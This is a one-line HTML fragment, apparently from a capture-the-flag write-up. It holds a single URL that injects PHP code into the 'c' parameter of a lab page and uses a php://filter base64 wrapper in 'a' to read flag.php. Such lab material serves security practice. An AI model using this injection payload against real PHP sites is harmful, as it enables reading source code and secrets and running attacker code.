&lt;p>&lt;code>http://ip/web/web3/index.php?c=include$_GET[&amp;quot;a&amp;quot;]?&amp;gt;&amp;amp;a=php://filter/read=convert.base64-encode/resource=flag.php&lt;/code>&lt;/p>
